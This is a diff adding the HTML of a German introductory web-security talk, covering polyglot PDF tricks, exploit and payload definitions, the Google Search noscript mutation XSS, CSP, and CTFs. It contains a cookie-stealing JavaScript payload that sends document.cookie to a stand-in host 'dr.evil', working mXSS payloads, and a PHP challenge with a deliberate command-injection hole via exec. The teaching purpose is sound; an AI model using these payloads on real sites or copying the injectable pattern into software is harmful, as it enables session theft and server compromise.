@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="generator" content="pandoc">
+  <meta name="author" content="maxammann">
+  <title>ctw - capture the web</title>
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+  <link rel="stylesheet" href="./reveal.js/css/reveal.css">
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <style>
+a.sourceLine { display: inline-block; line-height: 1.25; }
+a.sourceLine { pointer-events: none; color: inherit; text-decoration: inherit; }
+a.sourceLine:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode { white-space: pre; position: relative; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+code.sourceCode { white-space: pre-wrap; }
+a.sourceLine { text-indent: -1em; padding-left: 1em; }
+}
+pre.numberSource a.sourceLine
+  { position: relative; left: -4em; }
+pre.numberSource a.sourceLine::before
+  { content: attr(title);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; pointer-events: all; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  { color: #cccccc; background-color: #303030; }
+@media screen {
+a.sourceLine::before { text-decoration: underline; }
+}
+code span.al { color: #ffcfaf; } /* Alert */
+code span.an { color: #7f9f7f; font-weight: bold; } /* Annotation */
+code span.at { } /* Attribute */
+code span.bn { color: #dca3a3; } /* BaseN */
+code span.bu { } /* BuiltIn */
+code span.cf { color: #f0dfaf; } /* ControlFlow */
+code span.ch { color: #dca3a3; } /* Char */
+code span.cn { color: #dca3a3; font-weight: bold; } /* Constant */
+code span.co { color: #7f9f7f; } /* Comment */
+code span.cv { color: #7f9f7f; font-weight: bold; } /* CommentVar */
+code span.do { color: #7f9f7f; } /* Documentation */
+code span.dt { color: #dfdfbf; } /* DataType */
+code span.dv { color: #dcdccc; } /* DecVal */
+code span.er { color: #c3bf9f; } /* Error */
+code span.ex { } /* Extension */
+code span.fl { color: #c0bed1; } /* Float */
+code span.fu { color: #efef8f; } /* Function */
+code span.im { } /* Import */
+code span.in { color: #7f9f7f; font-weight: bold; } /* Information */
+code span.kw { color: #f0dfaf; } /* Keyword */
+code span.op { color: #f0efd0; } /* Operator */
+code span.ot { color: #efef8f; } /* Other */
+code span.pp { color: #ffcfaf; font-weight: bold; } /* Preprocessor */
+code span.sc { color: #dca3a3; } /* SpecialChar */
+code span.ss { color: #cc9393; } /* SpecialString */
+code span.st { color: #cc9393; } /* String */
+code span.va { } /* Variable */
+code span.vs { color: #cc9393; } /* VerbatimString */
+code span.wa { color: #7f9f7f; font-weight: bold; } /* Warning */
+  </style>
+  <link rel="stylesheet" href="./reveal.js/css/theme/black.css" id="theme">
+  <link rel="stylesheet" href="style.css"/>
+  <link rel="stylesheet" href="Font-Awesome/css/all.css"/>
+  <!-- Printing and PDF exports -->
+  <script>
+    var link = document.createElement( 'link' );
+    link.rel = 'stylesheet';
+    link.type = 'text/css';
+    link.href = window.location.search.match( /print-pdf/gi ) ? './reveal.js/css/print/pdf.css' : './reveal.js/css/print/paper.css';
+    document.getElementsByTagName( 'head' )[0].appendChild( link );
+  </script>
+  <!--[if lt IE 9]>
+  <script src="./reveal.js/lib/js/html5shiv.js"></script>
+  <![endif]-->
+  <script src="http://localhost:35729/livereload.js?snipver=1"></script>
+</head>
+<body>
+  <div class="reveal">
+    <div class="slides">
+
+<section id="title-slide">
+  <h1 class="title">ctw - capture the web</h1>
+  <p class="author">maxammann</p>
+  <p class="date">11. Juni, 2019</p>
+</section>
+
+<section id="lets-talk-about-files" class="slide level1">
+<h1>Lets talk about files</h1>
+</section>
+<section class="slide level1">
+
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb1-1" title="1"><span class="fu">wget</span> <span class="st">&quot;https://www.alchemistowl.org/pocorgtfo/pocorgtfo03.pdf&quot;</span></a>
+<a class="sourceLine" id="cb1-2" title="2"><span class="fu">firefox</span> <span class="st">&quot;pocorgtfo03.pdf&quot;</span></a></code></pre></div>
+<p><img data-src="./wats/pdf.png" height="400" /></p>
+<p><span style="position: absolute; bottom: 5px; right: 5px; font-size: 20px">Quelle: PoC||GTFO 0x03</span></p>
+</section>
+<section class="slide level1">
+
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb2-1" title="1"><span class="fu">cp</span> <span class="st">&quot;pocorgtfo03.pdf&quot;</span> <span class="st">&quot;pocorgtfo03.jpg&quot;</span></a>
+<a class="sourceLine" id="cb2-2" title="2"><span class="fu">firefox</span> <span class="st">&quot;pocorgtfo03.jpg&quot;</span></a></code></pre></div>
+<div class="fragment">
+<p><img data-src="./wats/jpg.png" height="400" /></p>
+</div>
+</section>
+<section class="slide level1">
+
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb3-1" title="1"><span class="fu">unzip</span> <span class="st">&quot;pocorgtfo03.pdf&quot;</span> -d <span class="st">&quot;unzipped/&quot;</span></a></code></pre></div>
+<div class="fragment">
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb4-1" title="1">  <span class="ex">Archive</span>:  pocorgtfo03.pdf</a>
+<a class="sourceLine" id="cb4-2" title="2">  <span class="ex">warning</span> [pocorgtfo03.pdf]: 12224072 extra bytes at</a>
+<a class="sourceLine" id="cb4-3" title="3">  <span class="ex">beginning</span> or within zipfile (attempting to process anyway)</a>
+<a class="sourceLine" id="cb4-4" title="4"><span class="ex">...</span></a>
+<a class="sourceLine" id="cb4-5" title="5">  <span class="ex">inflating</span>: unzipped/pocorgtfo02.pdf</a>
+<a class="sourceLine" id="cb4-6" title="6">  <span class="ex">inflating</span>: unzipped/pocorgtfo03-encrypt.py</a>
+<a class="sourceLine" id="cb4-7" title="7"><span class="ex">...</span></a></code></pre></div>
+</div>
+</section>
+<section class="slide level1">
+
+<video src="./wats/watcat-title.mp4" height="400" data-autoplay loop nocontrols>
+</section>
+<section class="slide level1">
+
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb5-1" title="1"><span class="fu">file</span> --brief <span class="st">&quot;unzipped/pocorgtfo03-encrypt.py&quot;</span></a>
+<a class="sourceLine" id="cb5-2" title="2"><span class="ex">Python</span> script, ASCII text executable</a>
+<a class="sourceLine" id="cb5-3" title="3"><span class="fu">python2</span> <span class="st">&quot;unzipped/pocorgtfo03-encrypt.py&quot;</span></a>
+<a class="sourceLine" id="cb5-4" title="4"><span class="fu">firefox</span> <span class="st">&quot;enc-pocorgtfo03.pdf.png&quot;</span></a></code></pre></div>
+<div class="fragment">
+<p><img data-src="./wats/png.png" height="350" /></p>
+</div>
+</section>
+<section class="slide level1">
+
+<video src="./figures/doggy_wat.mp4" height="300" data-autoplay loop nocontrols>
+</section>
+<section class="slide level1">
+
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb6-1" title="1"><span class="fu">aplay</span> -r 22050 -f S16_LE <span class="st">&quot;pocorgtfo03.pdf&quot;</span></a></code></pre></div>
+<div class="fragment">
+<object type="image/svg+xml" data="./wats/spec.svg">
+Your browser does not support SVG
+</object>
+<aside class="notes">
+<p>https://www.alchemistowl.org/pocorgtfo/pocorgtfo03.pdf Kapitel 11</p>
+</aside>
+<!-- # "weird machines"
+
+<div class="notes">
+http://langsec.org/papers/Bratus.pdf
+</div>
+-->
+</div>
+</section>
+<section class="slide level1">
+
+<h2 id="vulnerabilites">Vulnerabilites</h2>
+Eine <strong>Lücke oder Schwäche</strong> im Design oder der Implementation eines Systems, welche ausgenutzt werden kann um die Sicherheitsrichtlinie des Systems zu verletzen.<br />
+<br />
+<br />
+
+<div style="position: absolute; bottom: 5px; right: 5px; font-size: 20px">
+Quelle: IETF RFC 4949
+</div>
+</section>
+<section class="slide level1">
+
+<h2 id="exploit">Exploit</h2>
+<p><strong>Ein Exploit nutzt eine Vulnerability um eine bestimmte unerwartete Aktion auszuführen.</strong></p>
+<ul>
+<li>Vulnerability muss “exploitable” sein</li>
+<li>Exploits nutzen einen Payload um gewünschte Aktionen auszuführen</li>
+</ul>
+<!-- * Exploits sind abhänig von der Umgebung wie z.B.
+  * CPU Architektur
+  * OS (Linux x86, Window...)
+  * Browser (Firefox, Chrome...)
+-->
+</section>
+<section class="slide level1">
+
+<h3 id="payload">Payload</h3>
+<video src="./figures/bomb_ride.mp4" height="300" data-autoplay loop nocontrols>
+</section>
+<section class="slide level1">
+
+<h3 id="ajax-cookie-stealer-als-payload">AJAX Cookie Stealer als Payload:</h3>
+<div class="sourceCode" id="cb7"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb7-1" title="1"><span class="kw">var</span> xmlhttp <span class="op">=</span> <span class="kw">new</span> <span class="at">XMLHttpRequest</span>()<span class="op">;</span></a>
+<a class="sourceLine" id="cb7-2" title="2"><span class="va">xmlhttp</span>.<span class="at">open</span>(<span class="st">&quot;POST&quot;</span><span class="op">,</span> <span class="st">&quot;https://dr.evil/sink&quot;</span><span class="op">,</span> <span class="kw">true</span>)<span class="op">;</span></a>
+<a class="sourceLine" id="cb7-3" title="3"><span class="va">xmlhttp</span>.<span class="at">send</span>(<span class="va">JSON</span>.<span class="at">stringify</span>(<span class="op">{</span></a>
+<a class="sourceLine" id="cb7-4" title="4">  <span class="dt">hostname</span><span class="op">:</span> <span class="va">window</span>.<span class="va">location</span>.<span class="at">host</span><span class="op">,</span> </a>
+<a class="sourceLine" id="cb7-5" title="5">  <span class="dt">session</span><span class="op">:</span> <span class="va">document</span>.<span class="at">cookie</span></a>
+<a class="sourceLine" id="cb7-6" title="6"><span class="op">}</span>))<span class="op">;</span></a></code></pre></div>
+</section>
+<section id="beispiel-einer-xss" class="slide level1">
+<h1>Beispiel einer XSS</h1>
+<ul>
+<li>Vulterability: XSS</li>
+<li>Payload: z.B. unser Cookie Stealer oder hier <code>alert("XSS")</code></li>
+</ul>
+<br />
+<br />
+<br />
+
+<div style="position: absolute; bottom: 5px; right: 5px; font-size: 20px">
+Quelle: XSS on Google Search - Sanitizing HTML in The Client? von liveoverflow.com
+</div>
+</section>
+<section class="slide level1">
+
+<center>
+<code>&lt;div&gt;&lt;script title="&lt;/div&gt;"&gt;</code>
+</center>
+<div class="fragment">
+<p><img data-src="./xss/simple-a.png" height="300" /></p>
+</div>
+</section>
+<section class="slide level1">
+
+<center>
+<code>&lt;script&gt;&lt;div title="&lt;/script&gt;"&gt;</code>
+</center>
+<div class="fragment">
+<p><img data-src="./xss/simple-b.png" height="300" /></p>
+</div>
+</section>
+<section class="slide level1">
+
+<p>Aktuelle HTML-Parser sind zu komplex und zu unterschiedlich.</p>
+<p><strong>▶ Serverseitige Sanitisation ist nicht ausreichend!</strong></p>
+</section>
+<section class="slide level1">
+
+<h2 id="xss-sanitisation-mit-template">XSS Sanitisation mit <code>&lt;template&gt;</code></h2>
+<div class="sourceCode" id="cb8"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb8-1" title="1">template <span class="op">=</span> <span class="va">document</span>.<span class="at">createElement</span>(<span class="st">&quot;template&quot;</span>)</a>
+<a class="sourceLine" id="cb8-2" title="2"><span class="va">template</span>.<span class="at">innerHTML</span> <span class="op">=</span> <span class="st">&#39;&lt;img src=x onerror=alert(&quot;XSS&quot;)&gt;&#39;</span></a>
+<a class="sourceLine" id="cb8-3" title="3"></a>
+<a class="sourceLine" id="cb8-4" title="4"><span class="co">// Sanitize DOM structure</span></a>
+<a class="sourceLine" id="cb8-5" title="5"><span class="va">template</span>.<span class="va">content</span>.<span class="at">children</span>[<span class="dv">0</span>].<span class="at">removeAttribute</span>(<span class="st">&quot;onerror&quot;</span>)</a>
+<a class="sourceLine" id="cb8-6" title="6"></a>
+<a class="sourceLine" id="cb8-7" title="7">div <span class="op">=</span> <span class="va">document</span>.<span class="at">createElement</span>(<span class="st">&quot;div&quot;</span>)</a>
+<a class="sourceLine" id="cb8-8" title="8"><span class="va">div</span>.<span class="at">innerHTML</span> <span class="op">=</span> <span class="va">template</span>.<span class="at">innerHTML</span></a></code></pre></div>
+</section>
+<section class="slide level1">
+
+<div class="sourceCode" id="cb9"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb9-1" title="1">template <span class="op">=</span> <span class="va">document</span>.<span class="at">createElement</span>(<span class="st">&quot;template&quot;</span>)</a>
+<a class="sourceLine" id="cb9-2" title="2"><span class="va">template</span>.<span class="at">innerHTML</span> <span class="op">=</span> <span class="st">&#39;&lt;noscript&gt;&lt;p title=&quot;&lt;/noscript&gt;&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb9-3" title="3">    <span class="st">&#39;&lt;img src=x onerror=alert(&quot;XSS&quot;)&gt;&quot;&gt;&#39;</span></a></code></pre></div>
+<p><img data-src="./xss/template.png" height="200" /></p>
+</section>
+<section class="slide level1">
+
+<div class="sourceCode" id="cb10"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb10-1" title="1">div <span class="op">=</span> <span class="va">document</span>.<span class="at">createElement</span>(<span class="st">&quot;div&quot;</span>)</a>
+<a class="sourceLine" id="cb10-2" title="2"><span class="va">div</span>.<span class="at">innerHTML</span> <span class="op">=</span> <span class="va">template</span>.<span class="at">innerHTML</span></a></code></pre></div>
+<div class="fragment">
+<video onplay="alert('XSS')" src="./xss/hacked.mp4" height="200" data-autoplay loop nocontrols>
+</div>
+</section>
+<section class="slide level1">
+
+<div class="sourceCode" id="cb11"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb11-1" title="1">div <span class="op">=</span> <span class="va">document</span>.<span class="at">createElement</span>(<span class="st">&quot;div&quot;</span>)</a>
+<a class="sourceLine" id="cb11-2" title="2"><span class="va">div</span>.<span class="at">innerHTML</span> <span class="op">=</span> <span class="st">&#39;&lt;noscript&gt;&lt;p title=&quot;&lt;/noscript&gt;&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb11-3" title="3">    <span class="st">&#39;&lt;img src=x onerror=alert(&quot;XSS&quot;)&gt;&quot;&gt;&#39;</span></a></code></pre></div>
+<p><img data-src="./xss/div.png" height="200" /></p>
+</section>
+<section class="slide level1">
+
+<p><sup></p>
+<pre><code>&lt;noscript&gt;&lt;p title=&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert(&quot;XSS&quot;)&gt;&quot;&gt;</code></pre>
+<p></sup></p>
+<p><img data-src="./xss/template.png" alt="DOM Tree für &lt;template&gt;" height="160" /> <img data-src="./xss/div.png" alt="DOM Tree für &lt;div&gt;" height="160" /></p>
+<p><strong>Der DOM Tree ist je nach Kontext unterschiedlich, obwohl der ursprüngliche HTML-Code der gleiche ist!</strong></p>
+</section>
+<section class="slide level1">
+
+<h2 id="was-passiert-hier">Was passiert hier?</h2>
+<style>
+    .reveal blockquote { width: 100% }
+</style>
+<blockquote>
+4.12.2 The noscript element<br />
+The noscript element represents <strong>nothing if scripting is enabled</strong>, and represents its <strong>children if scripting is disabled</strong>.
+</blockquote>
+<p>Da in einem <code>&lt;template&gt;</code> tag scripting deaktiviert ist, werden unterschiedliche DOM Trees gebaut.</p>
+</section>
+<section class="slide level1">
+
+<ul>
+<li>Vulnerability bestand in der Google Suche für 4 Monate! (<a href="https://github.com/google/closure-library/commit/c79ab48e8e962fee57e68739c00e16b9934c0ffa">git commit</a>)</li>
+<li><strong>Severity: <font color=red>Very High <i class="fas fa-bolt"></i></font></strong></li>
+</ul>
+</section>
+<section class="slide level1">
+
+<h2 id="content-security-policy-to-the-rescue"><code>Content-Security-Policy</code> to the rescue</h2>
+<p><br />
+<br />
+CSP is a strong defense-in-depth mechanism against XSS.<br />
+<br />
+<span style="position: absolute; bottom: 5px; right: 5px; font-size: 20px">Quelle: https://www.w3.org/TR/CSP3/</span></p>
+</section>
+<section class="slide level1">
+
+<div class="sourceCode" id="cb13"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb13-1" title="1">Content<span class="op">-</span>Security<span class="op">-</span>Policy<span class="op">:</span>  <span class="im">default</span><span class="op">-</span>src <span class="st">&#39;self&#39;</span><span class="op">;</span> </a>
+<a class="sourceLine" id="cb13-2" title="2">                          img<span class="op">-</span>src <span class="op">*;</span> </a>
+<a class="sourceLine" id="cb13-3" title="3">                          script<span class="op">-</span>src <span class="va">scripts</span>.<span class="va">example</span>.<span class="at">com</span></a></code></pre></div>
+<p>Verbietet inlinen von JavaScript und lässt nur bestimmte Quellen zu.</p>
+</section>
+<section class="slide level1">
+
+<div class="sourceCode" id="cb14"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb14-1" title="1">Content<span class="op">-</span>Security<span class="op">-</span>Policy<span class="op">:</span>  script<span class="op">-</span>src <span class="st">&#39;nonce-r4nd0m&#39;</span><span class="op">;</span> </a>
+<a class="sourceLine" id="cb14-2" title="2">                          img<span class="op">-</span>src <span class="op">*;</span></a></code></pre></div>
+Geblockt von CSP:
+<div class="strikethrough">
+<div class="sourceCode" id="cb15"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb15-1" title="1"><span class="kw">&lt;img</span><span class="ot"> src=</span><span class="st">x</span><span class="ot"> onerror=</span><span class="st">alert(</span><span class="er">&quot;XSS&quot;)</span><span class="kw">&gt;</span></a>
+<a class="sourceLine" id="cb15-2" title="2"><span class="kw">&lt;script&gt;</span><span class="at">alert</span>(<span class="st">&quot;XSS&quot;</span>)<span class="kw">&lt;/script&gt;</span></a></code></pre></div>
+</div>
+<div class="fragment">
+<p>Erlaubt:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb16-1" title="1"><span class="kw">&lt;script</span><span class="ot"> nonce=</span><span class="st">&quot;nonce-r4nd0m&quot;</span><span class="kw">&gt;</span><span class="at">alert</span>(<span class="st">&quot;XSS&quot;</span>)<span class="kw">&lt;/script&gt;</span></a>
+<a class="sourceLine" id="cb16-2" title="2"><span class="kw">&lt;script</span><span class="ot"> nonce=</span><span class="st">&quot;nonce-r4nd0m&quot;</span> </a>
+<a class="sourceLine" id="cb16-3" title="3"><span class="ot">        src=</span><span class="st">&quot;https://cdn/lib.js&quot;</span><span class="kw">&gt;&lt;/script&gt;</span></a></code></pre></div>
+<p><font color=red>Hinweis: Erstetzt nicht das beheben von Fehlern!</font></p>
+</div>
+</section>
+<section class="slide level1">
+
+<p><img data-src="./figures/support.png" /></p>
+</section>
+<section class="slide level1">
+
+<figure>
+<img data-src="./google_vuln_stats.png" alt="Google Vulnerability Reward Program payouts in 2018" /><figcaption>Google Vulnerability Reward Program payouts in 2018</figcaption>
+</figure>
+</section>
+<section id="was-sind-ctfs" class="slide level1">
+<h1>Was sind CTFs?</h1>
+<ul>
+<li>Capture the Flag sind Wettkämpfe</li>
+<li>Trainiert Frusttoleranz</li>
+<li>Anfänger: Ausnutzen eines Buffer-Overflow</li>
+<li>Profi: Finden iner Zero-Day in Safari 🤯</li>
+</ul>
+</section>
+<section class="slide level1">
+
+<h2 id="grab-a-beer-and-ctf">Grab a beer and ctf!</h2>
+<div class="sourceCode" id="cb17"><pre class="sourceCode php"><code class="sourceCode php"><a class="sourceLine" id="cb17-1" title="1"><span class="kw">&lt;?php</span></a>
+<a class="sourceLine" id="cb17-2" title="2"><span class="kw">if</span> <span class="ot">(</span><span class="kw">empty</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;hmac&#39;</span><span class="ot">])</span> || <span class="kw">empty</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;host&#39;</span><span class="ot">]))</span> {</a>
+<a class="sourceLine" id="cb17-3" title="3">    <span class="fu">header</span><span class="ot">(</span><span class="st">&#39;HTTP/1.0 400 Bad Request&#39;</span><span class="ot">);</span> <span class="kw">exit</span><span class="ot">;</span></a>
+<a class="sourceLine" id="cb17-4" title="4">}</a>
+<a class="sourceLine" id="cb17-5" title="5"><span class="kw">$secret</span> = <span class="fu">getenv</span><span class="ot">(</span><span class="st">&quot;SECRET&quot;</span><span class="ot">);</span> </a>
+<a class="sourceLine" id="cb17-6" title="6"><span class="kw">if</span> <span class="ot">(</span><span class="kw">isset</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;nonce&#39;</span><span class="ot">]))</span></a>
+<a class="sourceLine" id="cb17-7" title="7">    <span class="kw">$secret</span> = <span class="fu">hash_hmac</span><span class="ot">(</span><span class="st">&#39;sha256&#39;</span><span class="ot">,</span> <span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;nonce&#39;</span><span class="ot">],</span> <span class="kw">$secret</span><span class="ot">);</span></a>
+<a class="sourceLine" id="cb17-8" title="8"><span class="kw">$hmac</span> = <span class="fu">hash_hmac</span><span class="ot">(</span><span class="st">&#39;sha256&#39;</span><span class="ot">,</span> <span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;host&#39;</span><span class="ot">],</span> <span class="kw">$secret</span><span class="ot">);</span></a>
+<a class="sourceLine" id="cb17-9" title="9"><span class="kw">if</span> <span class="ot">(</span><span class="kw">$hmac</span> !== <span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;hmac&#39;</span><span class="ot">])</span> {</a>
+<a class="sourceLine" id="cb17-10" title="10">    <span class="fu">header</span><span class="ot">(</span><span class="st">&#39;HTTP/1.0 403 Forbidden&#39;</span><span class="ot">);</span> <span class="kw">exit</span><span class="ot">;</span></a>
+<a class="sourceLine" id="cb17-11" title="11">}</a>
+<a class="sourceLine" id="cb17-12" title="12"><span class="kw">echo</span> <span class="fu">exec</span><span class="ot">(</span><span class="st">&quot;host &quot;</span>.<span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;host&#39;</span><span class="ot">]);</span></a>
+<a class="sourceLine" id="cb17-13" title="13"><span class="kw">?&gt;</span></a></code></pre></div>
+<p><span style="position: absolute; bottom: 5px; right: 5px; font-size: 20px">Quelle: www.securify.nl/en/blog/SFY20180101/spot-the-bug-challenge-2018-warm-up.html</span></p>
+<p><sub> <i class="far fa-envelope"></i> <a href="https://maxammann.org/contact">maxammann.org/contact</a> <i class="fas fa-code"></i> <a href="https://github.com/maxammann">github.com/maxammann</a> </sub></p>
+</section>
+    </div>
+  </div>
+
+  <script src="./reveal.js/lib/js/head.min.js"></script>
+  <script src="./reveal.js/js/reveal.js"></script>
+
+  <script>
+
+      // Full list of configuration options available at:
+      // https://github.com/hakimel/reveal.js#configuration
+      Reveal.initialize({
+        // Display the page number of the current slide
+        slideNumber: true,
+        // Push each slide change to the browser history
+        history: true,
+        // Transition style
+        transition: 'none', // none/fade/slide/convex/concave/zoom
+
+        // Optional reveal.js plugins
+        dependencies: [
+          { src: './reveal.js/lib/js/classList.js', condition: function() { return !document.body.classList; } },
+          { src: './reveal.js/plugin/zoom-js/zoom.js', async: true },
+          { src: './reveal.js/plugin/notes/notes.js', async: true }
+        ]
+      });
+    </script>
+    </body>
+</html>
